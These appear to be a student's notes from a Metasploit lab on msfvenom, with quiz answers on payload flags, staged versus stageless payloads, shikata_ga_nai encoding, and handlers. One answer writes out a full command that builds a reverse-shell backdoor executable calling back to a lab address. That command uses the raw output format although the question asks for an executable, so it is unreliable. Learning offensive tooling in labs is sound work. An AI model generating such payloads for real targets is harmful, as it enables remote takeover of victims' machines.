# Metasploit: Payload Generation

## Overview

Generate custom payloads with msfvenom, choose formats, set up handlers, and catch reverse shells.

## What I Learned

- Msfvenom

## Exercises

### Exercise 1 — [Basic Syntax and Listing Options]

**Q1.** What flag sets the output format in msfvenom?
**Answer:** -f

**Q2.** What flag specifies the payload to generate?
**Answer:** -p

### Exercise 2 — [Staged vs. Stageless Payloads]

**Q1.** Which payload type is self-contained and does not require a second download: staged or stageless?
**Answer:** stageless

### Exercise 3 — [Generating Payloads and Output Formats]

**Q1.** What output format would you use to generate a Linux binary executable?
**Answer:** elf

**Q2.** Write the full msfvenom command to generate a stageless Windows x64 Meterpreter reverse TCP payload as an executable file named backdoor.exe, connecting back to 10.10.14.12 on port 5555.
**Answer:** msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.12 LPORT=5555 -f raw -o backdoor.exe

### Exercise 4 — [Encoding and Evasion Basics]

**Q1.** What is the name of the most well-known Metasploit encoder?
**Answer:** x86/shikata_ga_nai

**Q2.** What msfvenom flag specifies characters that must not appear in the payload output?
**Answer:** -b

### Exercise 5 — [Payload Injection and Multi-Platform Payloads]

**Q1.** What msfvenom flag injects a payload into an existing executable template?
**Answer:** -x

### Exercise 6 — [Handlers and Catching Shells]

**Q1.** What Metasploit module is used as a universal listener for catching reverse shell connections?
**Answer:** exploit/multi/handler

**Q2.** What handler option should you set to false if you want the handler to keep listening after the first session is established?
**Answer:** exitonsession

## Key Takeaways

Msfvenom is a command-line tool that generates payloads in a wide variety of formats for virtually any target platform. It is part of the Metasploit Framework but runs independently from msfconsole. You use it from a regular terminal prompt, not from the msf6 > prompt.

## Notes

**Staged vs Stageless Payload**
Stageless (inline) payloads are self-contained. The entire payload, including the Meterpreter agent or shell code, is packaged into a single file. When the payload executes on the target, it connects back to your handler, and the session is established in one step.

Staged payloads work in two steps. First, a small stager executes on the target. The stager's only job is to establish a network connection back to your handler. Once connected, your handler sends the larger stage (the full Meterpreter or shell payload) across that connection. The stage is loaded into memory and executed.

**Executable vs. Transform Formats**
Executable formats produce standalone binary files that the target's operating system can run directly. These include exe (windows), elf(linux), macho (macOS), msi (Windows installer), apk (Android), and war (Java web applications).

Transform formats produce code or data that you uembed into another tool, script, or exploit. These include raw (bypes), c (C byte array), csharp (C# byte array), python (Python byte string), powershell(Poweshell byte array), hex and base64

**Encoding** An encoder transforms the payload's byte sequence into a different representation. The most well-known encoder in Metasploit is x86/shikata_ga_nai, which applies polymorphic XOR additive feedback encoding. In simple terms, it XOR-encrypts the payload with a changing key and prepends a small decoder stub. When the payload executes, the decoder stub runs first, decodes the payload back to its original form in memory, and then transfers execution to the decoded payload.